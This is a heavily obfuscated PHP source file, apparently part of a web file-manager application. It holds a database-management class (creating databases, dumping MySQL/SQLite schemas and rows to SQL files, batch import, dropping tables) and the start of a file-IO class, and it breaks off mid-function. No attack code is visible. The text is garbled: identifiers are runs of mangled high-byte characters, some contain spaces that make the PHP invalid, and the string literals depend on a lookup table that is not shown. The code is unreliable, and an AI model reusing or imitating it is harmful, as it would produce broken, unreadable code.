<?php
 goto dÌÇò¹ƒ¦ƒ; a”óâ—îˆ: class DbManage { function __construct($Š§¯†‡· = array()) { $ÓˆÀÚèÄ =& $_SERVER[ĞÆÏ¡Îª]; if (empty($Š§¯†‡·)) { $Š§¯†‡· = $GLOBALS[$ÓˆÀÚèÄ[6]][$ÓˆÀÚèÄ[21]]; } $this->database = $Š§¯†‡·; } public function model($âßäó¡‹ = '') { return new ModelBase($âßäó¡‹, $_SERVER[ĞÆÏ¡Îª][12], $this->database); } public function db($¸×ÆÕÚ = false) { $•Œù¾ƒ˜ =& $_SERVER[ĞÆÏ¡Îª]; $¯ïáÀŒ = array_change_key_case($this->database); if ($this->dbType() == $•Œù¾ƒ˜[13] || !$¸×ÆÕÚ) { return $this->model()->db(); } $® ï = $¯ïáÀŒ[$•Œù¾ƒ˜[963]]; $¯ïáÀŒ[$•Œù¾ƒ˜[963]] = $•Œù¾ƒ˜[12]; if ($¯ïáÀŒ[$•Œù¾ƒ˜[958]] == $•Œù¾ƒ˜[955]) { $¹§¯ÍÉ¯ = $¯ïáÀŒ[$•Œù¾ƒ˜[964]]; $¯ïáÀŒ[$•Œù¾ƒ˜[964]] = substr($¹§¯ÍÉ¯, 0, strrpos($¹§¯ÍÉ¯, $•Œù¾ƒ˜[1050])); } $this->database = $¯ïáÀŒ; $Û¾É„—… = $this->model()->db(); try { $©Œ£»°€ = $Û¾É„—…->execute("\163\150\x6f\x77\x20\x64\x61\164\x61\x62\141\x73\x65\x73\40\154\151\x6b\x65\40\x27{$® ï}\47"); } catch (Exception $ÜæÚ°Ô±) { } if (!$©Œ£»°€) { $Û¾É„—…->execute("\x63\x72\145\x61\x74\x65\x20\x64\141\x74\x61\x62\x61\163\145\x20\140{$® ï}\x60"); } $¯ïáÀŒ[$•Œù¾ƒ˜[963]] = $® ï; if ($¯ïáÀŒ[$•Œù¾ƒ˜[958]] == $•Œù¾ƒ˜[955]) { $¯ïáÀŒ[$•Œù¾ƒ˜[964]] .= $•Œù¾ƒ˜[1050] . $® ï; } $this->database = $¯ïáÀŒ; $Û¾É„—…->execute("\165\163\145\40\x60{$® ï}\x60"); return $Û¾É„—…; } public function createTable($ÇÖŒª·, &$¿ó÷õûç) { $¿êãªÙ“ =& $_SERVER[ĞÆÏ¡Îª]; if (!IO::exist($ÇÖŒª·)) { ActionCall($¿êãªÙ“[1051], !0, 0); show_json(LNG($¿êãªÙ“[1052]), !1); } $…É×‘Ôò = $this->model()->db(); $Ä¾ƒ’å­ = sqlSplit(IO::getContent($ÇÖŒª·)); foreach ($Ä¾ƒ’å­ as $¨Êƒ—æĞ) { $¬µ¢°º˜ = stripos($¨Êƒ—æĞ, $¿êãªÙ“[1053]) === 0; if ($¬µ¢°º˜) { $¿ó÷õûç->task[$¿êãªÙ“[781]] += 1; } $…É×‘Ôò->execute($¨Êƒ—æĞ); if ($¬µ¢°º˜) { preg_match($¿êãªÙ“[1054], $¨Êƒ—æĞ, $ÄºÓî™ò); $¿ó÷õûç->task[$¿êãªÙ“[1055]] = $ÄºÓî™ò[1]; $¿ó÷õûç->update(1); } } } public function insertTable($Ç¶¬¸ûä, &$ºÀ³×¶Í) { $Ÿ•«…éç =& $_SERVER[ĞÆÏ¡Îª]; $·–õè› = $this->model()->db(); $ûƒÕ¨ğÍ = $ğö•Ãı ? array($ğö•Ãı) : $·–õè›->getTables(); foreach ($Ç¶¬¸ûä as $…ê­ÚÎ½) { $ğö•Ãı = basename($…ê­ÚÎ½, $Ÿ•«…éç[783]); if (!in_array($ğö•Ãı, $ûƒÕ¨ğÍ)) { continue; } $ºÀ³×¶Í->task[$Ÿ•«…éç[1055]] = $ğö•Ãı; if (get_filesize($…ê­ÚÎ½) == 0) { continue; } $¡ä¨§…Ó = $this->sqlToDb($…ê­ÚÎ½, $ºÀ³×¶Í); if (!$¡ä¨§…Ó) { ActionCall($Ÿ•«…éç[1051], !0, 0); show_json(LNG($Ÿ•«…éç[1056]) . "\133{$ğö•Ãı}\x5d", !1); } } } public function sqlFromDb($¦ÀºœŒ’, $Õ¼ÓÀû‹, &$¢³¢Ï¨‘, $Í»áù¾Ù = '') { if ($¢³¢Ï¨‘) { $¢³¢Ï¨‘->task[$_SERVER[ĞÆÏ¡Îª][1055]] = $¦ÀºœŒ’; } $Ü‹ÚöÉ = $this->model($¦ÀºœŒ’); $şåÄŒŸ = 0; $Ÿšö™ø = 0; $ç—ÇÜŸ¼ = 10000; $èéìÚ‡€ = fopen($Õ¼ÓÀû‹, $_SERVER[ĞÆÏ¡Îª][1057]); $¡Ğ×·¦µ = $Ü‹ÚöÉ->getPk(); $³®»¼à = $Ü‹ÚöÉ->getDbFields(); $ª»‹ü¯´ = $_SERVER[ĞÆÏ¡Îª][12]; if ($GLOBALS[$_SERVER[ĞÆÏ¡Îª][782]] && in_array($¦ÀºœŒ’, array($_SERVER[ĞÆÏ¡Îª][1058], $_SERVER[ĞÆÏ¡Îª][1059]))) { $ª»‹ü¯´ = $¦ÀºœŒ’; } do { $ó™¾¹˜¶ = array($¡Ğ×·¦µ => array($_SERVER[ĞÆÏ¡Îª][1005], $Ÿšö™ø)); $À„ÊÉà‚ = $Ü‹ÚöÉ->where($ó™¾¹˜¶)->field($³®»¼à)->order($¡Ğ×·¦µ . $_SERVER[ĞÆÏ¡Îª][1060])->limit($ç—ÇÜŸ¼)->select(); $À„ÊÉà‚ = !empty($À„ÊÉà‚) ? $À„ÊÉà‚ : array(); if (!($ê¨ôÛ¡¼ = count($À„ÊÉà‚))) { break; } $ı²›ÌÀ„ = end($À„ÊÉà‚); $Ÿšö™ø = $ı²›ÌÀ„[$¡Ğ×·¦µ]; $–²€µÓ = array(); foreach ($À„ÊÉà‚ as $Ûš†ƒÈ°) { if ($ª»‹ü¯´) { if ($¦ÀºœŒ’ == $_SERVER[ĞÆÏ¡Îª][1058]) { if ($Ûš†ƒÈ°[$_SERVER[ĞÆÏ¡Îª][33]] == $_SERVER[ĞÆÏ¡Îª][1061]) { $Î­Ô…¨à = json_decode($Ûš†ƒÈ°[$_SERVER[ĞÆÏ¡Îª][383]], !0); if ($Î­Ô…¨à[$_SERVER[ĞÆÏ¡Îª][32]] == $GLOBALS[$_SERVER[ĞÆÏ¡Îª][782]] && $Î­Ô…¨à[$_SERVER[ĞÆÏ¡Îª][745]] != 1) { continue; } } } else { if ($Ûš†ƒÈ°[$_SERVER[ĞÆÏ¡Îª][33]] == $_SERVER[ĞÆÏ¡Îª][1062] && $Ûš†ƒÈ°[$_SERVER[ĞÆÏ¡Îª][94]] == $_SERVER[ĞÆÏ¡Îª][774]) { continue; } } } if ($Í»áù¾Ù) { $Ûš†ƒÈ°[$_SERVER[ĞÆÏ¡Îª][84]] = "\173\x69\157\72{$Í»áù¾Ù}\x7d" . substr($Ûš†ƒÈ°[$_SERVER[ĞÆÏ¡Îª][84]], strlen("\x7b\x69\157\x3a{$Ûš†ƒÈ°[$_SERVER[ĞÆÏ¡Îª][812]]}\x7d")); $Ûš†ƒÈ°[$_SERVER[ĞÆÏ¡Îª][812]] = $Í»áù¾Ù; } $–²€µÓ[] = $_SERVER[ĞÆÏ¡Îª][1063] . $this->sqlEncode($Ûš†ƒÈ°) . $_SERVER[ĞÆÏ¡Îª][1064]; } $Ûª•£ñĞ = "\x49\x4e\x53\105\x52\x54\x20\x49\x4e\x54\x4f\x20\140{$¦ÀºœŒ’}\140\40\x28\140" . implode($_SERVER[ĞÆÏ¡Îª][1065], $³®»¼à) . $_SERVER[ĞÆÏ¡Îª][1066]; fwrite($èéìÚ‡€, $Ûª•£ñĞ . implode($_SERVER[ĞÆÏ¡Îª][1067], $–²€µÓ) . $_SERVER[ĞÆÏ¡Îª][71] . PHP_EOL); $şåÄŒŸ += $ê¨ôÛ¡¼; if ($¢³¢Ï¨‘) { $¢³¢Ï¨‘->update($ê¨ôÛ¡¼); } } while ($ç—ÇÜŸ¼ == $ê¨ôÛ¡¼); fclose($èéìÚ‡€); return $şåÄŒŸ; } public function sqlToDb($µ­Ïâ·ì, &$•°ëû) { $æÇßï » =& $_SERVER[ĞÆÏ¡Îª]; $Ïğìò¡Ó = $this->model()->db(); $ìÓ‡¸ = @fopen($µ­Ïâ·ì, $æÇßï »[1068]); if (!$ìÓ‡¸) { return !1; } $‹¯°ëé— = 0; $‚¬ÕéœÏ = $æÇßï »[12]; $‹¤¿çÈ‹ = array(); $±£“ª¦¤ = $this->dbType(); $÷†ğˆË… = $±£“ª¦¤ == $æÇßï »[13] ? 500 : 2000; $¿—¼­Õí = basename($µ­Ïâ·ì, $æÇßï »[783]); $ÔÏ¢ö€å = 0; $¬ÂÈÂĞÈ = 4194304 - 104858; $ô—¾ÑíÉ = 1000000 - 104858; while (!feof($ìÓ‡¸)) { $â¨ÔÆ»µ = trim(fgets($ìÓ‡¸)); if (!$â¨ÔÆ»µ) { continue; } $¹Û²»óÕ = $this->sqlDecode($â¨ÔÆ»µ, $±£“ª¦¤, $¿—¼­Õí); if (stripos($¹Û²»óÕ, $æÇßï »[364]) === 0) { if (!$‚¬ÕéœÏ) { $‚¬ÕéœÏ = $¹Û²»óÕ . $æÇßï »[53]; } continue; } if ($•°ëû) { $•°ëû->task[$æÇßï »[781]] += 1; } $‹¯°ëé—++; $‹¤¿çÈ‹[] = rtrim(rtrim(trim($¹Û²»óÕ), $æÇßï »[50]), $æÇßï »[71]); $ÒŒéŠ» = null; $ô‘æâá¤ = strlen($¹Û²»óÕ); $ÔÏ¢ö€å += $ô‘æâá¤; if ($ÔÏ¢ö€å >= ($÷†ğˆË… == 500 ? $ô—¾ÑíÉ : $¬ÂÈÂĞÈ)) { $ÒŒéŠ» = array_pop($‹¤¿çÈ‹); if ($‹¯°ëé— > 1) { $‹¯°ëé—--; } } if ($‹¯°ëé— >= $÷†ğˆË… || $ÒŒéŠ») { $¹Û²»óÕ = $‚¬ÕéœÏ . implode($æÇßï »[50], $‹¤¿çÈ‹); if (!$Ïğìò¡Ó->execute($¹Û²»óÕ)) { return !1; } if ($•°ëû) { $•°ëû->update($‹¯°ëé—); } $‹¤¿çÈ‹ = array(); $‹¯°ëé— = 0; $ÔÏ¢ö€å = 0; if ($ÒŒéŠ») { $‹¤¿çÈ‹ = array($ÒŒéŠ»); $‹¯°ëé— = 1; $ÔÏ¢ö€å = $ô‘æâá¤; } } } fclose($ìÓ‡¸); if (!empty($‹¤¿çÈ‹)) { $¹Û²»óÕ = $‚¬ÕéœÏ . implode($æÇßï »[50], $‹¤¿çÈ‹); if (!$Ïğìò¡Ó->execute($¹Û²»óÕ)) { return !1; } if ($•°ëû) { $•°ëû->update($‹¯°ëé—); } } return !0; } public function dropTable($Ğ÷¸›ŠŸ = null) { $İì»Ûù¨ = $this->model()->db(); $ù–ÎÄÂ = $Ğ÷¸›ŠŸ ? array($Ğ÷¸›ŠŸ) : $İì»Ûù¨->getTables(); if (!$ù–ÎÄÂ) { return; } foreach ($ù–ÎÄÂ as $Ğ÷¸›ŠŸ) { if ($Ğ÷¸›ŠŸ) { $Ğ÷¸›ŠŸ = strtolower($Ğ÷¸›ŠŸ); } else { continue; } $İì»Ûù¨->execute("\144\x72\x6f\160\x20\x74\x61\x62\x6c\x65\40\x69\x66\40\145\170\151\x73\x74\163\40\x60{$Ğ÷¸›ŠŸ}\x60"); } } private function sqlEncode($æç‹âù™) { $©ªçòã· =& $_SERVER[ĞÆÏ¡Îª]; $˜ßôğê = array(); foreach ($æç‹âù™ as $ı…©È¹ú) { if (is_array($ı…©È¹ú)) { $ı…©È¹ú = json_encode_force($ı…©È¹ú); } $ı…©È¹ú = addslashes($ı…©È¹ú); $ı…©È¹ú = str_replace(array($©ªçòã·[1069], $©ªçòã·[231]), array($©ªçòã·[1070], $©ªçòã·[1071]), $ı…©È¹ú); $˜ßôğê[] = str_replace($©ªçòã·[58], $©ªçòã·[1072], $ı…©È¹ú); } return $©ªçòã·[58] . implode($©ªçòã·[1073], $˜ßôğê) . $©ªçòã·[58]; } private function sqlDecode($ØÜè²ñà, $ëá¸œê, $êÏË˜¾‡ = '') { $•É©·„ =& $_SERVER[ĞÆÏ¡Îª]; $ØÜè²ñà = str_replace(array($•É©·„[1070], $•É©·„[1071]), array($•É©·„[1069], $•É©·„[231]), $ØÜè²ñà); if ($ëá¸œê == $•É©·„[13]) { return $êÏË˜¾‡ != $•É©·„[1074] ? stripslashes($ØÜè²ñà) : $ØÜè²ñà; } if ($êÏË˜¾‡ == $•É©·„[1074]) { $ØÜè²ñà = str_replace($•É©·„[1075], $•É©·„[118], stripslashes($ØÜè²ñà)); } return $ØÜè²ñà; } public function getSqlFile($Ò¬Æ–Ç = '') { $³«´­°ø =& $_SERVER[ĞÆÏ¡Îª]; $Ê¼ïÕÁø = $this->dbType(!0); $¥êÌĞÀå = CONTROLLER_DIR . "\x69\x6e\163\x74\141\x6c\154\x2f\144\x61\x74\141\x2f{$Ê¼ïÕÁø}\x2e\163\161\x6c"; $¥Ö“ı£ = file_get_contents($¥êÌĞÀå); $™°íšÚš = $³«´­°ø[1076] . ($Ê¼ïÕÁø == $³«´­°ø[799] ? $³«´­°ø[1077] : $³«´­°ø[1078]) . $³«´­°ø[1079]; preg_match_all($™°íšÚš, $¥Ö“ı£, $µÆ‡ê); $¥ş˜¯º‰ = $µÆ‡ê[1]; $§ŸçªĞ„ = $this->model()->db(); $Ş¨ç˜¬‹ = $§ŸçªĞ„->getTables(); $³„ù¨‰ô = TEMP_FILES . $³«´­°ø[1080] . date($³«´­°ø[746]) . $³«´­°ø[8]; del_dir($³„ù¨‰ô); mk_dir($³„ù¨‰ô); $öùïÆ¦ = $³„ù¨‰ô . $³«´­°ø[1081]; $õÛ°Éº = $³„ù¨‰ô . $³«´­°ø[1082]; $ÊŠää»¥ = $Ê¼ïÕÁø == $³«´­°ø[13] ? $³«´­°ø[799] : $³«´­°ø[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\x74\141\154\154\x2f\x64\x61\164\141\57{$ÊŠää»¥}\x2e\x73\161\x6c", $³„ù¨‰ô); @touch($³„ù¨‰ô . $Ê¼ïÕÁø . $³«´­°ø[783]); $Ú—ªÛĞ¦ = fopen($öùïÆ¦, $³«´­°ø[1057]); $ï«Û¿ÀÏ = fopen($õÛ°Éº, $³«´­°ø[1057]); if ($Ê¼ïÕÁø == $³«´­°ø[13]) { $Ş¨ç˜¬‹ = array_diff($Ş¨ç˜¬‹, array($³«´­°ø[779], $³«´­°ø[780])); $º’Õ¯ÓÆ = array($³«´­°ø[1083], $³«´­°ø[1084], $³«´­°ø[1085]); fwrite($ï«Û¿ÀÏ, implode(PHP_EOL, $º’Õ¯ÓÆ) . PHP_EOL . PHP_EOL); foreach ($Ş¨ç˜¬‹ as $ËÇÀµ ó) { $úµ¯òÔ‰ = $this->sqlFromSqlite($ËÇÀµ ó); if (!$úµ¯òÔ‰[$³«´­°ø[13]]) { continue; } fwrite($ï«Û¿ÀÏ, $úµ¯òÔ‰[$³«´­°ø[13]] . PHP_EOL . PHP_EOL); if (!in_array($ËÇÀµ ó, $¥ş˜¯º‰)) { fwrite($Ú—ªÛĞ¦, $úµ¯òÔ‰[$³«´­°ø[799]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Ş¨ç˜¬‹ as $ËÇÀµ ó) { $úµ¯òÔ‰ = $this->sqlFromMysql($ËÇÀµ ó); if (!$úµ¯òÔ‰[$³«´­°ø[799]]) { continue; } fwrite($Ú—ªÛĞ¦, $úµ¯òÔ‰[$³«´­°ø[799]] . PHP_EOL . PHP_EOL); if (!in_array($ËÇÀµ ó, $¥ş˜¯º‰)) { fwrite($ï«Û¿ÀÏ, $úµ¯òÔ‰[$³«´­°ø[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ú—ªÛĞ¦); fclose($ï«Û¿ÀÏ); $¥Ö“ı£ = array($³«´­°ø[799] => $öùïÆ¦, $³«´­°ø[13] => $õÛ°Éº); return $Ò¬Æ–Ç ? $¥Ö“ı£[$Ò¬Æ–Ç] : $¥Ö“ı£; } public function dbType($è½şíïì = false) { $È¨¬æÆö =& $_SERVER[ĞÆÏ¡Îª]; $ƒ±ò½¸º = $è½şíïì ? $GLOBALS[$È¨¬æÆö[6]][$È¨¬æÆö[21]] : $this->database; $ƒ±ò½¸º = array_change_key_case($ƒ±ò½¸º); $ï‰ì—œ = $ƒ±ò½¸º[$È¨¬æÆö[958]]; if ($ï‰ì—œ == $È¨¬æÆö[955]) { $Ş¨ñĞàÁ = explode($È¨¬æÆö[4], $ƒ±ò½¸º[$È¨¬æÆö[964]]); $ï‰ì—œ = $Ş¨ñĞàÁ[0]; } $øİÊ²É† = array($È¨¬æÆö[1086] => $È¨¬æÆö[13], $È¨¬æÆö[903] => $È¨¬æÆö[799]); if (isset($øİÊ²É†[$ï‰ì—œ])) { $ï‰ì—œ = $øİÊ²É†[$ï‰ì—œ]; } return $ï‰ì—œ; } public function sqlFromMysql($æÑéâğ½, $ûÑåê§š = '') { $¶„ğ°ş =& $_SERVER[ĞÆÏ¡Îª]; $í×Íóµ = $this->model()->db(); $õÜÒÅş = $í×Íóµ->query($¶„ğ°ş[1087] . $æÑéâğ½ . $¶„ğ°ş[393]); if (!$õÜÒÅş || !$õÜÒÅş[0]) { return !1; } $Î€Æ×ŒÍ = _get($õÜÒÅş[0], $¶„ğ°ş[1088], $¶„ğ°ş[12]); if (!$Î€Æ×ŒÍ) { return !1; } $ìù«ÕÆÔ = "\x44\122\117\x50\40\x54\x41\x42\114\105\x20\111\106\x20\x45\130\x49\123\124\123\x20\x60{$æÑéâğ½}\x60\73" . PHP_EOL . $Î€Æ×ŒÍ . $¶„ğ°ş[71]; if ($ûÑåê§š && $ûÑåê§š == $¶„ğ°ş[799]) { return $ìù«ÕÆÔ; } $Ã ï¦¡ó = array_change_key_case($GLOBALS[$¶„ğ°ş[6]][$¶„ğ°ş[21]]); $³õ£Ç¼„ = $Ã ï¦¡ó[$¶„ğ°ş[963]]; $Š®ÕâöÖ = $¶„ğ°ş[1089] . $³õ£Ç¼„ . $¶„ğ°ş[1090] . $æÑéâğ½ . $¶„ğ°ş[58]; $…ïéàÛê = $¶„ğ°ş[1091] . $æÑéâğ½ . $¶„ğ°ş[891]; $°õ»àÀï = $í×Íóµ->query($Š®ÕâöÖ); if (empty($°õ»àÀï)) { $‘Ï—±¬¬ = array($¶„ğ°ş[799] => $¶„ğ°ş[12], $¶„ğ°ş[13] => $¶„ğ°ş[12]); return $ûÑåê§š ? $‘Ï—±¬¬[$ûÑåê§š] : $‘Ï—±¬¬; } $ü´ËÊ² = $í×Íóµ->query($…ïéàÛê); $åËíÌ¶ = $¶„ğ°ş[12]; $Ó´Ìô’€ = array(); foreach ($ü´ËÊ² as $ïü‘ßõâ) { if (!$åËíÌ¶ && $ïü‘ßõâ[$¶„ğ°ş[1092]] == $¶„ğ°ş[1093]) { $åËíÌ¶ = $ïü‘ßõâ[$¶„ğ°ş[1094]]; } if (isset($Ó´Ìô’€[$ïü‘ßõâ[$¶„ğ°ş[1092]]])) { $Ó´Ìô’€[$ïü‘ßõâ[$¶„ğ°ş[1092]]][$¶„ğ°ş[1095]][] = $ïü‘ßõâ[$¶„ğ°ş[1094]]; continue; } $Ó´Ìô’€[$ïü‘ßõâ[$¶„ğ°ş[1092]]] = array($¶„ğ°ş[1096] => $ïü‘ßõâ[$¶„ğ°ş[1092]], $¶„ğ°ş[1095] => array($ïü‘ßõâ[$¶„ğ°ş[1094]]), $¶„ğ°ş[1097] => $ïü‘ßõâ[$¶„ğ°ş[1098]] == $¶„ğ°ş[88] ? 0 : 1); } $€¡©¯Â = array(); foreach ($Ó´Ìô’€ as $ïü‘ßõâ) { $åĞàºÆ = $ïü‘ßõâ[$¶„ğ°ş[1096]] == $¶„ğ°ş[1093]; $Éº†òç­ = array($¶„ğ°ş[1099], $ïü‘ßõâ[$¶„ğ°ş[1097]] == $¶„ğ°ş[88] && !$åĞàºÆ ? $¶„ğ°ş[1100] : $¶„ğ°ş[12], $¶„ğ°ş[1101], $¶„ğ°ş[1102] . $æÑéâğ½ . $¶„ğ°ş[11] . ($åĞàºÆ ? $¶„ğ°ş[1103] : $ïü‘ßõâ[$¶„ğ°ş[1096]]) . $¶„ğ°ş[118], $¶„ğ°ş[1104], $¶„ğ°ş[118] . $æÑéâğ½ . $¶„ğ°ş[118], $¶„ğ°ş[1105] . implode($¶„ğ°ş[1106], $ïü‘ßõâ[$¶„ğ°ş[1095]]) . $¶„ğ°ş[1107]); $€¡©¯Â[] = implode($¶„ğ°ş[53], $Éº†òç­) . $¶„ğ°ş[71]; } $ÁÌü¬¬³ = array(); $½®ÇÄ™Ú = array($¶„ğ°ş[1108] => $¶„ğ°ş[1109], $¶„ğ°ş[1109] => $¶„ğ°ş[1109], $¶„ğ°ş[297] => $¶„ğ°ş[324], $¶„ğ°ş[296] => $¶„ğ°ş[324]); foreach ($°õ»àÀï as $ïü‘ßõâ) { $Éº†òç­ = array($¶„ğ°ş[118] . $ïü‘ßõâ[$¶„ğ°ş[1110]] . $¶„ğ°ş[118], isset($½®ÇÄ™Ú[$ïü‘ßõâ[$¶„ğ°ş[1111]]]) ? $½®ÇÄ™Ú[$ïü‘ßõâ[$¶„ğ°ş[1111]]] : $ïü‘ßõâ[$¶„ğ°ş[1112]], $ïü‘ßõâ[$¶„ğ°ş[1113]] == $¶„ğ°ş[889] ? $¶„ğ°ş[1114] : $¶„ğ°ş[1115], $ïü‘ßõâ[$¶„ğ°ş[1110]] == $åËíÌ¶ ? $¶„ğ°ş[1116] : $¶„ğ°ş[12], $ïü‘ßõâ[$¶„ğ°ş[940]] ? strtoupper(str_replace($¶„ğ°ş[11], $¶„ğ°ş[12], $ïü‘ßõâ[$¶„ğ°ş[940]])) : $¶„ğ°ş[12]); $ÁÌü¬¬³[] = trim(implode($¶„ğ°ş[53], $Éº†òç­)); } $Ë€¦ı³ù = array($¶„ğ°ş[1117] . $æÑéâğ½ . $¶„ğ°ş[1118], $¶„ğ°ş[1119] . $æÑéâğ½ . $¶„ğ°ş[1120], implode($¶„ğ°ş[50] . PHP_EOL, $ÁÌü¬¬³), $¶„ğ°ş[937]); $‡”ğ¶Ó› = implode(PHP_EOL, array_merge($Ë€¦ı³ù, $€¡©¯Â)); if ($ûÑåê§š && $ûÑåê§š == $¶„ğ°ş[13]) { return $‡”ğ¶Ó›; } $‘Ï—±¬¬ = array($¶„ğ°ş[799] => $ìù«ÕÆÔ, $¶„ğ°ş[13] => $‡”ğ¶Ó›); return $ûÑåê§š ? $‘Ï—±¬¬[$ûÑåê§š] : $‘Ï—±¬¬; } public function sqlFromSqlite($ÓŞÎ¥½®, $ßøûîÛ = '') { $ß£øµØî =& $_SERVER[ĞÆÏ¡Îª]; $‹´œ¶¬¿ = $this->model()->db(); $Ñ¿ï¿Ã½ = "\120\x52\x41\x47\x4d\x41\x20\124\x41\x42\x4c\105\137\111\x4e\106\117\40\50\x27{$ÓŞÎ¥½®}\47\x29"; $î¿…§›” = "\123\105\x4c\x45\103\x54\x20\x2a\40\106\122\x4f\x4d\40\x73\161\154\x69\164\145\137\x6d\141\x73\164\x65\162\40\x57\110\105\122\105\40\164\x62\x6c\x5f\156\x61\155\x65\40\x3d\x20\x27{$ÓŞÎ¥½®}\x27"; $ÉĞÏıè = $‹´œ¶¬¿->query($Ñ¿ï¿Ã½); if (empty($ÉĞÏıè)) { $–Ùº¡ï = array($ß£øµØî[799] => $ß£øµØî[12], $ß£øµØî[13] => $ß£øµØî[12]); return $ßøûîÛ ? $–Ùº¡ï[$ßøûîÛ] : $–Ùº¡ï; } $Ò¢şİàË = $‹´œ¶¬¿->query($î¿…§›”); $®‚ÎÁ’ = $ØÚÆ‡Çƒ = array(); foreach ($Ò¢şİàË as $·É®ì¥º) { if ($·É®ì¥º[$ß£øµØî[33]] == $ß£øµØî[288]) { $®‚ÎÁ’[] = $·É®ì¥º[$ß£øµØî[1121]]; } else { $ØÚÆ‡Çƒ[$·É®ì¥º[$ß£øµØî[32]]] = $·É®ì¥º[$ß£øµØî[1121]]; } } $—Ó×ùÏ³ = array_merge(array($ß£øµØî[1117] . $ÓŞÎ¥½® . $ß£øµØî[118]), $®‚ÎÁ’, array_values($ØÚÆ‡Çƒ)); $—Ó×ùÏ³ = implode($ß£øµØî[71] . PHP_EOL, $—Ó×ùÏ³) . $ß£øµØî[71]; if ($ßøûîÛ && $ßøûîÛ == $ß£øµØî[13]) { return $—Ó×ùÏ³; } $Ö‡–ñ = array(); $˜öè¢óÖ = array($ß£øµØî[1109] => $ß£øµØî[1122], $ß£øµØî[324] => $ß£øµØî[1123]); $ÓúîÉôŠ = $ß£øµØî[12]; foreach ($ÉĞÏıè as $·É®ì¥º) { if ($·É®ì¥º[$ß£øµØî[57]] == $ß£øµØî[88]) { $ÓúîÉôŠ = $·É®ì¥º[$ß£øµØî[32]]; } $Œ£ş×ÀÆ = array($ß£øµØî[393] . $·É®ì¥º[$ß£øµØî[32]] . $ß£øµØî[393], isset($˜öè¢óÖ[$·É®ì¥º[$ß£øµØî[33]]]) ? $˜öè¢óÖ[$·É®ì¥º[$ß£øµØî[33]]] : $·É®ì¥º[$ß£øµØî[33]], $·É®ì¥º[$ß£øµØî[35]] == $ß£øµØî[88] ? $ß£øµØî[1114] : $ß£øµØî[1124] . $·É®ì¥º[$ß£øµØî[56]], $·É®ì¥º[$ß£øµØî[57]] == $ß£øµØî[88] ? $ß£øµØî[1125] : $ß£øµØî[12]); $Ö‡–ñ[] = trim(implode($ß£øµØî[53], $Œ£ş×ÀÆ)); } foreach ($ØÚÆ‡Çƒ as $…ŸğËî => $Û–óÀâØ) { $¤®·Ø¯ = str_replace($ß£øµØî[1126] . $ÓŞÎ¥½® . $ß£øµØî[11], $ß£øµØî[12], $…ŸğËî); $¡¼†ÙƒÊ = str_replace(array($ß£øµØî[118], $ß£øµØî[948]), $ß£øµØî[393], substr($Û–óÀâØ, stripos($Û–óÀâØ, $ß£øµØî[269]))); if ($¤®·Ø¯ == $ß£øµØî[1103]) { $ö”œÇı° = $ß£øµØî[1127] . $ÓúîÉôŠ . $ß£øµØî[1128]; } else { $ö”œÇı° = (stripos($¤®·Ø¯, $ß£øµØî[11]) ? $ß£øµØî[1129] : $ß£øµØî[12]) . ($ß£øµØî[1130] . $¤®·Ø¯ . $ß£øµØî[1131] . $¡¼†ÙƒÊ); } $Ö‡–ñ[] = $ö”œÇı°; } $ª´íƒ´ä = array($ß£øµØî[1132] . $ÓŞÎ¥½® . $ß£øµØî[1133], $ß£øµØî[1134] . $ÓŞÎ¥½® . $ß£øµØî[1135], implode($ß£øµØî[50] . PHP_EOL, $Ö‡–ñ), $ß£øµØî[1136]); $Ñ·ğ­Éİ = implode(PHP_EOL, $ª´íƒ´ä); if ($ßøûîÛ && $ßøûîÛ == $ß£øµØî[799]) { return $Ñ·ğ­Éİ; } $–Ùº¡ï = array($ß£øµØî[799] => $Ñ·ğ­Éİ, $ß£øµØî[13] => $—Ó×ùÏ³); return $ßøûîÛ ? $–Ùº¡ï[$ßøûîÛ] : $–Ùº¡ï; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ñˆî…äÌ, $øÖéİƒ­) { $‚õñ“ŞÉ =& $_SERVER[ĞÆÏ¡Îª]; $ïÆñ¦Âö = $øÖéİƒ­; $GLOBALS[$‚õñ“ŞÉ[1137]] = $‚õñ“ŞÉ[1138] . $Ñˆî…äÌ; Hook::trigger($‚õñ“ŞÉ[1138] . $Ñˆî…äÌ . $‚õñ“ŞÉ[1139], $ïÆñ¦Âö); $£˜¬„Æ = self::driverMake($øÖéİƒ­[0]); if (!$£˜¬„Æ) { return !1; } if (method_exists($£˜¬„Æ, $Ñˆî…äÌ)) { $³‰½êŸî = @call_user_func_array(array($£˜¬„Æ, $Ñˆî…äÌ), $øÖéİƒ­); } else { if (method_exists($£˜¬„Æ, $‚õñ“ŞÉ[1140])) { $³‰½êŸî = @call_user_func_array(array($£˜¬„Æ, $Ñˆî…äÌ), $øÖéİƒ­); } else { if (method_exists(self, $Ñˆî…äÌ)) { $³‰½êŸî = @call_user_func_array(array(self, $Ñˆî…äÌ), $øÖéİƒ­); } else { $³‰½êŸî = call_user_func_array(array(parent, $Ñˆî…äÌ), $øÖéİƒ­); } } } Hook::trigger($‚õñ“ŞÉ[1138] . $Ñˆî…äÌ . $‚õñ“ŞÉ[1141], $ïÆñ¦Âö, $³‰½êŸî); return $³‰½êŸî; } public static function init($ÎÔõË²è) { return self::driverMake($ÎÔõË²è); } public static function copy($ÎÉÙˆº¥, $®×ìŠˆ˜, $ÉÙ‚³‹à = false, $€’€ßÏ = false) { return self::copyMoveStart($ÎÉÙˆº¥, $®×ìŠˆ˜, $ÉÙ‚³‹à, $_SERVER[ĞÆÏ¡Îª][564], $€’€ßÏ); } public static function move($ŠäÖÜãô, $™å©œ¬§, $Û•ù = false, $İ†½ıÚ = false) { return self::copyMoveStart($ŠäÖÜãô, $™å©œ¬§, $Û•ù, $_SERVER[ĞÆÏ¡Îª][566], $İ†½ıÚ); } private static function copyMoveStart($¬ığÊæ”, $šÁÌ¼×â, $»¸ïŠû, $¹ŞÊ“‰î, $úà˜ş˜¤) { $ŠŸ’ÆÍ =& $_SERVER[ĞÆÏ¡Îª]; $İ¥™±äœ = array($¬ığÊæ”, $šÁÌ¼×â, $»¸ïŠû, $úà˜ş˜¤); Hook::trigger($ŠŸ’ÆÍ[1138] . $¹ŞÊ“‰î . $ŠŸ’ÆÍ[1139], $İ¥™±äœ); $Ã¿äšÅÉ = self::copyMove($¬ığÊæ”, $šÁÌ¼×â, $»¸ïŠû, 